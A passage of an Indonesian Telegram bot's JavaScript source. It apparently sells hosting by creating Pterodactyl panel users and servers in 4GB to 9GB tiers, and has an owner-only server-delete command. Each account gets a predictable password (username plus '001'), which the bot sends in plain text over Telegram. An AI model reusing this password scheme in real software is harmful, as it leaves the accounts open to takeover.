РћЈРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
РћѓRULES :
РћѓРђб Jangan Ddos Server
РћѓРђб Wajib tutup domain saat screenshot
РћѓРђб Jngan bagikan domain ke siapapun
РћЌРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
­ЮЌќ­ЮЌЦ­ЮЌў­ЮЌћ­ЮЌД­ЮЌў ­ЮЌБ­ЮЌћ­ЮЌА­ЮЌў­ЮЌЪ ­ЮЌЋ­ЮЌг ­ЮЌб­ЮЌД­ЮЌћ­ЮЌФ`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!­ЪћЦ"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan­Ъў«РђЇ­Ъње.");
  }
});
//Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░//
// 4gb
bot.onText(/\/4gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /4gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "4gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "4048";
  const cpu = "110";
  const disk = "4048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya­ЪўЂ
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
├Ќ═ю├Ќ Login : ${domain}
├Ќ═ю├Ќ Username : ${user.username}
├Ќ═ю├Ќ Password : ${password} 
РћЈРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
Рћѓ RULES :
РћѓРђб Jangan Ddos Server
РћѓРђб Wajib tutup domain saat screenshot
РћѓРђб Jngan bagikan domain ke siapapun
РћЌРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
­ЮЌќ­ЮЌЦ­ЮЌў­ЮЌћ­ЮЌД­ЮЌў ­ЮЌБ­ЮЌћ­ЮЌА­ЮЌў­ЮЌЪ ­ЮЌЋ­ЮЌг ­ЮЌб­ЮЌД­ЮЌћ­ЮЌФ`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!­ЪћЦ"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan­Ъў«РђЇ­Ъње.");
  }
});
//Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░//
// 5gb
bot.onText(/\/5gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /5gb namapanel,idtele");
    return;
  }
  const username = t[0]; 
  const u = t[1];
  const name = username + "5gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "5048";
  const cpu = "140";
  const disk = "5048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya­ЪўЂ
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

PANEL DATA ANDA :
├Ќ═ю├Ќ Login : ${domain}
├Ќ═ю├Ќ Username : ${user.username}
├Ќ═ю├Ќ Password : ${password} 
РћЈРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
РћѓRULES :
РћѓРђб Jangan Ddos Server
РћѓРђб Wajib tutup domain saat screenshot
РћѓРђб Jngan bagikan domain ke siapapun
РћЌРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
­ЮЌќ­ЮЌЦ­ЮЌў­ЮЌћ­ЮЌД­ЮЌў ­ЮЌБ­ЮЌћ­ЮЌА­ЮЌў­ЮЌЪ ­ЮЌЋ­ЮЌг ­ЮЌб­ЮЌД­ЮЌћ­ЮЌФ`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!­ЪћЦ"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan­Ъў«РђЇ­Ъње.");
  }
});
//Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░//
bot.onText(/\/delsrv (.+)/, async (msg, match) => {
 const chatId = msg.chat.id;
 const senderId = msg.from.id;
 const srv = match[1].trim();

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "­Юў┐­ЮЎќ­ЮЎБ ­ЮЎћ­ЮЎќ­ЮЎЦ!? ­ЮЎђ­ЮЎБ­ЮЎЕ­ЮЎџ ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќ? ­ЮЎћ­ЮЎќ­ЮЎБ­ЮЎю ­Юўй­ЮЎъ­ЮЎе­ЮЎќ ­ЮЎѕ­ЮЎќ­ЮЎа­ЮЎџ ­ЮўЙ­ЮЎф­ЮЎб­ЮЎќ­ЮЎБ ­ЮЎі­ЮЎг­ЮЎБ­ЮЎџ­ЮЎД ­ЮЎѓ­ЮЎг!!Рюў­ЊѓИ",
            { parse_mode: "Markdown" }
        );
  }

  if (!srv) {
    bot.sendMessage(
      chatId,
      "Mohon masukkan ID server yang ingin dihapus, contoh: /delsrv 1234"
    );
    return;
  }

  try {
    let f = await fetch(domain + "/api/application/servers/" + srv, {
      method: "DELETE",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
    });

    let res = f.ok ? { errors: null } : await f.json();

    if (res.errors) {
      bot.sendMessage(chatId, "SERVER TIDAK ADA");
    } else {
      bot.sendMessage(chatId, "SUCCESFULLY DELETE SERVER");
    }
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, "Terjadi kesalahan saat menghapus server.");
  }
});

bot.onText(/\/6gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /6gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "6gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "6048";
  const cpu = "170";
  const disk = "6048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya­ЪўЂ
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
├Ќ═ю├Ќ Login : ${domain}
├Ќ═ю├Ќ Username : ${user.username}
├Ќ═ю├Ќ Password : ${password} 
РћЈРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
РћѓRULES :
РћѓРђб Jangan Ddos Server
РћѓРђб Wajib tutup domain saat screenshot
РћѓРђб Jngan bagikan domain ke siapapun
РћЌРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
­ЮЌќ­ЮЌЦ­ЮЌў­ЮЌћ­ЮЌД­ЮЌў ­ЮЌБ­ЮЌћ­ЮЌА­ЮЌў­ЮЌЪ ­ЮЌЋ­ЮЌг ­ЮЌб­ЮЌД­ЮЌћ­ЮЌФ`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!­ЪћЦ"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan­Ъў«РђЇ­Ъње.");
  }
});
//Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░//
// 7gb
bot.onText(/\/7gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /7gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "7gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "7048";
  const cpu = "200";
  const disk = "7048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya­ЪўЂ
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
├Ќ═ю├Ќ Login : ${domain}
├Ќ═ю├Ќ Username : ${user.username}
├Ќ═ю├Ќ Password : ${password} 
РћЈРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
РћѓРђб Jangan Ddos Server
РћѓРђб Wajib tutup domain saat screenshot
РћѓРђб Jngan bagikan domain ke siapapun
РћЌРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
­ЮЌќ­ЮЌЦ­ЮЌў­ЮЌћ­ЮЌД­ЮЌў ­ЮЌБ­ЮЌћ­ЮЌА­ЮЌў­ЮЌЪ ­ЮЌЋ­ЮЌг ­ЮЌб­ЮЌД­ЮЌћ­ЮЌФ`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!­ЪћЦ"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan­Ъў«РђЇ­Ъње.");
  }
});
//Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░//
// 8gb
bot.onText(/\/8gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
  
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /8gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "8gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "8048";
  const cpu = "230";
  const disk = "8048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya­ЪўЂ
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
├Ќ═ю├Ќ Login : ${domain}
├Ќ═ю├Ќ Username : ${user.username}
├Ќ═ю├Ќ Password : ${password} 
РћЈРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
РћѓRULES :
РћѓРђб Jangan Ddos Server
РћѓРђб Wajib tutup domain saat screenshot
РћѓРђб Jngan bagikan domain ke siapapun
РћЌРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
­ЮЌќ­ЮЌЦ­ЮЌў­ЮЌћ­ЮЌД­ЮЌў ­ЮЌБ­ЮЌћ­ЮЌА­ЮЌў­ЮЌЪ ­ЮЌЋ­ЮЌг ­ЮЌб­ЮЌД­ЮЌћ­ЮЌФ`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!­ЪћЦ"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan­Ъў«РђЇ­Ъње.");
  }
});
//Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░//
// 9gb
bot.onText(/\/9gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
